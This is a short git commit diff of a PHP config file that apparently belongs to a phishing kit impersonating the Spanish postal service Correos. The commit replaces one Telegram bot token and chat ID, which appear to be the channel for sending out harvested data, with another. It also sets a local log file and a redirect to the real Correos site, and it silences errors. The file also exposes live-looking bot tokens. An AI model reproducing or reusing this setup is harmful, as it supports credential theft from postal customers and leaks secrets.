8b213b96ddeabdde2f839438ce77f1e8e7503c48
es72852 <116832484+es72852@users.noreply.github.com>
2022-10-27 19:14:52 +0200

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,9 +2,9 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5035323443:AAHA9c7jEp7O_hpEXFNfcuatiQGguxVxEdA");
-define("TELEGRAM_CHAT_ID", "741885334");
-define("TELEGRAM_CHAT_IDD", "-741885334");
+define("TELEGRAM_TOKEN", "5645658165:AAG9I9x34RtfhGviNJ_XQVUTfJILY1E-vAQ");
+define("TELEGRAM_CHAT_ID", "-864465557");
+define("TELEGRAM_CHAT_IDD", "-864465557");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
